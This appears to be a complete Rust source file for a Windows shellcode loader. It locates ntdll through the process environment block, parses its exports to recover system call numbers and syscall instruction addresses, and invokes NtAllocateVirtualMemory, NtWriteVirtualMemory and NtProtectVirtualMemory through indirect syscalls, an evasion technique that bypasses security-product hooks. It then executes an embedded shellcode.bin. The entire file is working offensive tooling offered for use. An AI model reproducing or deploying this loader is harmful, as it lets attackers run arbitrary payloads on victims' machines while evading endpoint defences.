use std::{arch::global_asm, ffi::CStr, os::raw::c_void, ptr::null_mut};

use ntapi::{ntkeapi::ProfileLoadLinkedIssues, ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PTEB};
use windows_sys::Win32::System::{
    Diagnostics::Debug::IMAGE_NT_HEADERS64,
    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE},
    SystemServices::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

global_asm!(
    ".section .data
    SSN: .word 0
    Syscall_Addr: .quad 0

    .section .text   
    Sys_NtAllocateVirtualMemory:
        mov r10, rcx
        mov rax, [rip + SSN]
        jmp [rip + Syscall_Addr]
        ret
    
    Sys_NtWriteVirtualMemory:
        mov r10, rcx
        mov rax, [rip + SSN]
        jmp [rip + Syscall_Addr]
        ret

    Sys_NtProtectVirtualMemory:
        mov r10, rcx
        mov rax, [rip + SSN]
        jmp [rip + Syscall_Addr]
        ret
    "
);

unsafe extern "win64" {
    fn Sys_NtAllocateVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut *mut c_void,
        ZeroBits: usize,
        RegionSize: *mut usize,
        AllocationType: u32,
        Protect: u32,
    ) -> i32;
    fn Sys_NtWriteVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut c_void,
        Buffer: *mut c_void,
        BufferSize: usize,
        NumberOfBytesWritten: *mut usize,
    ) -> i32;
    fn Sys_NtProtectVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut *mut c_void,
        RegionSize: *mut usize,
        NewProtect: u32,
        OldProtect: *mut u32,
    ) -> i32;
}

unsafe extern "C" {
    static mut SSN: u32;
    static mut Syscall_Addr: *const c_void;
}

fn get_current_teb() -> PTEB {
    let mut teb: PTEB = null_mut();
    unsafe {
        #[cfg(target_arch = "x86_64")]
        std::arch::asm!(
            "mov {}, gs:[0x30]",
            out(reg) teb
        );
        #[cfg(target_arch = "x86")]
        std::arch::asm!(
            "mov {}, fs:[0x18]",
            out(reg) teb
        );
        teb
    }
}

fn get_ssn(func_name: &str, syscall_addr: &mut *mut c_void) -> u32 {
    let mut ssn: u32 = 0;
    unsafe {
        let teb = get_current_teb();
        let peb = (*teb).ProcessEnvironmentBlock;

        let ldr_data_entry = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;

        let ntdll_base = (*ldr_data_entry).DllBase;

        println!("ntdll.dll base address: {:p}", ntdll_base);

        let dos_headers = ntdll_base as *const IMAGE_DOS_HEADER;

        if (*dos_headers).e_magic != IMAGE_DOS_SIGNATURE {
            println!("Invalid DOS signature");
            return 0;
        }

        let nt_headers = (ntdll_base as *const u8).add((*dos_headers).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("Invalid NT signature");
            return 0;
        }

        let export_directory = (ntdll_base as *const u8)
            .add((*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
            as *const IMAGE_EXPORT_DIRECTORY;

        let address_of_functions = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfFunctions as usize)
            as *const u32;
        let address_of_names = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfNames as usize)
            as *const u32;
        let address_of_name_ordinals = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfNameOrdinals as usize)
            as *const u16;

        for i in 0..(*export_directory).NumberOfNames as isize {
            let fun_name =
                (ntdll_base as *const u8).add(*address_of_names.offset(i) as usize) as *const i8;

            let ordinal = *address_of_name_ordinals.offset(i) as usize;

            if ordinal >= (*export_directory).NumberOfFunctions as usize {
                continue;
            }

            // let function_rva = *address_of_functions.offset(ordinal as isize);
            let function_addr = (ntdll_base as *const u8).add(
                *address_of_functions
                    .offset((*address_of_name_ordinals.offset(i) as usize) as isize)
                    as usize,
            );

            let c_str = CStr::from_ptr(fun_name);

            if let Ok(function_name) = c_str.to_str() {
                if func_name.eq_ignore_ascii_case(function_name) {
                    println!(
                        "[+] Found function: {} at address: {:p}",
                        function_name, function_addr
                    );

                    for i in 0..32 {
                        let bytes = function_addr as *const u8;

                        if *bytes.offset(i) == 0x4c
                            && *bytes.offset(1) == 0x8b
                            && *bytes.offset(2) == 0xd1
                            && *bytes.offset(3) == 0xb8
                            && *bytes.offset(6) == 0x00
                            && *bytes.offset(7) == 0x00
                        {
                            let low = *bytes.offset(4) as u32;
                            let high = *bytes.offset(5) as u32;
                            ssn = (high << 8) | low;

                            // return ssn;
                        }

                        if *bytes.offset(i) == 0x0f && *bytes.offset(i + 1) == 0x05 {
                            *syscall_addr = function_addr.offset(i) as *mut c_void;
                            break;
                        }
                    }
                }
            }
        }
    }
    return ssn;
}

type ShellcodeFn = unsafe extern "C" fn() -> ();

fn main() {
    let mut syscall_addr: *mut c_void = null_mut();
    let ssn = get_ssn("NtAllocateVirtualMemory", &mut syscall_addr);
    println!("[+] NtAllocateVirtualMemory SSN: 0x{:X}", ssn);
    println!(
        "[+] NtAllocateVirtualMemory syscall address: {:p}",
        syscall_addr
    );

    let mut base_address: *mut c_void = null_mut();
    let mut size = SHELLCODE.len();
    unsafe {
        SSN = ssn;
        Syscall_Addr = syscall_addr;
    }
    let status = unsafe {
        Sys_NtAllocateVirtualMemory(
            -1isize as *mut c_void,
            &mut base_address,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if status != 0 {
        println!(
            "[-] NtAllocateVirtualMemory failed with status: 0x{:X}",
            status
        );
        return;
    }

    println!("[+] Allocated {} bytes at {:p}", size, base_address);

    let mut bytes_written: usize = 0;
    let ssn = get_ssn("NtWriteVirtualMemory", &mut syscall_addr);
    println!("[+] NtWriteVirtualMemory SSN: 0x{:X}", ssn);
    println!(
        "[+] NtWriteVirtualMemory syscall address: {:p}",
        syscall_addr
    );
    unsafe {
        SSN = ssn;
        Syscall_Addr = syscall_addr;
    }

    let status = unsafe {
        Sys_NtWriteVirtualMemory(
            -1isize as *mut c_void,
            base_address,
            SHELLCODE.as_ptr() as _,
            SHELLCODE.len(),
            &mut bytes_written,
        )
    };

    if status != 0 {
        println!(
            "[-] NtWriteVirtualMemory failed with status: 0x{:X}",
            status
        );
        return;
    }

    println!("[+] Wrote {} bytes at {:p}", bytes_written, base_address);

    let mut old_protect: u32 = 0;
    let ssn = get_ssn("NtProtectVirtualMemory", &mut syscall_addr);
    println!("[+] NtProtectVirtualMemory SSN: 0x{:X}", ssn);
    println!(
        "[+] NtProtectVirtualMemory syscall address: {:p}",
        syscall_addr
    );
    unsafe {
        SSN = ssn;
        Syscall_Addr = syscall_addr;
    }

    size = SHELLCODE.len();

    let status = unsafe {
        Sys_NtProtectVirtualMemory(
            -1isize as *mut c_void,
            &mut base_address,
            &mut size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    if status != 0 {
        println!(
            "[-] NtProtectVirtualMemory failed with status: 0x{:X}",
            status
        );
        return;
    }

    let shellcode_fn: ShellcodeFn = unsafe { std::mem::transmute(base_address) };
    println!("[+] Executing shellcode...");
    unsafe { shellcode_fn() };
}
